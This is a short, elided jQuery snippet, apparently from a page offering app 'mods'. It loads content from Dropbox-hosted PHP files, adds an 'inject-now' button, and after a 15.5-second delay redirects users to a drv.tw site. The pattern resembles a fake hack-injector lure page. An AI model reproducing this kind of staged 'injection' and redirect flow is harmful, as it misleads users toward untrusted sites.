...
$(document).ready(function() {
	...
	$('li.app-listing-row').click(function () {
		...
		$.ajax({
			type: "GET",
			url: "https://dl.dropboxusercontent.com/s/l3ilfozzpoejtxv/xo.php",
			success: function(dataprocess){
				...
				$('#inject-now').click(function () {
					$.ajax({
						type: "GET",
						url: "https://dl.dropboxusercontent.com/s/r41oovy191frjbg/x0.php",
						success: function(dataprocess){
							...
							setTimeout(function() {
								window.location.replace("https://w1eiwegv733ozzhleiodbqa.on.drv.tw/www.sxmod.com/");
							}, 15500 );
						}	
					});	
				});
